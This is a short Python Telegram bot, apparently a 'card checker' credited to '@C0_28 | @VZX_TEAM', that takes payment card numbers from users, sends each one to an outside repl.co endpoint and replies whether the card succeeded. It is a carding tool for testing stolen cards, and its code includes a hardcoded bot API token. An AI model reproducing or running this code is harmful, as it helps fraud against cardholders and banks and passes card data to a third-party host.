import requests
import json
import telebot

bot = telebot.TeleBot("5588418954:AAE2XfYSFdFvr3TNd5gNHw6SnJIPLL8iVcQ")

@bot.message_handler(commands=["start"])
def start(message):
	bot.send_message(message.chat.id, text="Hi, Bot Check Cards\nSend Crad To Check\nProgrammer : @C0_28 | @VZX_TEAM")

@bot.message_handler(func=lambda m: True)
def check(message):
	card = message.text
	url = requests.get("https://reback.trakosdiaa1.repl.co/cc?c="+card).text
	resp = json.loads(url)
	status = resp["status"]
	if status == "error":
		bot.send_message(message.chat.id, text="Card : {}\nStatus : Error".format(card))
	if status == "success":
		bot.send_message(message.chat.id, text="Card : {}\nStatus : Success".format(card))

bot.polling(True)